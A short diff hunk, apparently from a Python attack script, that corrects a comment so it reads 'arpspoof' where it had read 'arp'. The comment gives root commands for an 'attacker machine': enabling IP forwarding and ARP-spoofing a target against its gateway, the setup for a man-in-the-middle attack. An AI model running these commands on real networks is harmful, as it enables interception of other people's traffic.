@@ -43,4 +43,4 @@ if __name__ == '__main__':
 
 # run below commands on attacker machine as root
 # echo 1 > /proc/sys/net/ipv4/ip_forward
-# arp -i eth0 -t <target> <gateway>
+# arpspoof -i eth0 -t <target> <gateway>
